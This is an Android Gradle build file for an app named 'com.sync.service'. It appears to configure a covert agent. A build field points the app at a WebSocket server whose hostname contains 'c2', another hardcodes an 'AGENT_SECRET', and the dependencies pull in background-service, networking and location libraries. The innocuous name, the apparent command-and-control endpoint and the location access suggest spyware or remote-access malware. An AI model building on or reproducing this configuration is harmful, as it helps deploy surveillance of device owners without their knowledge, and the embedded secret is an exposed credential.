plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.sync.service"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.sync.service"
        minSdk = 23
        targetSdk = 34
        versionCode = 1
        versionName = "2.0"
        buildConfigField("String", "SERVER_URL", "\"wss://queen-hadil-c2.onrender.com\"")
        buildConfigField("String", "AGENT_SECRET", "\"MySecret2024abc123XYZ\"")
    }

    buildTypes {
        release { isMinifyEnabled = false }
        debug { isMinifyEnabled = false }
    }

    buildFeatures { buildConfig = true }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions { jvmTarget = "17" }
}

dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("com.google.android.material:material:1.11.0")
    implementation("androidx.lifecycle:lifecycle-service:2.7.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
    implementation("org.json:json:20231013")
    implementation("com.google.android.gms:play-services-location:21.0.1")
}
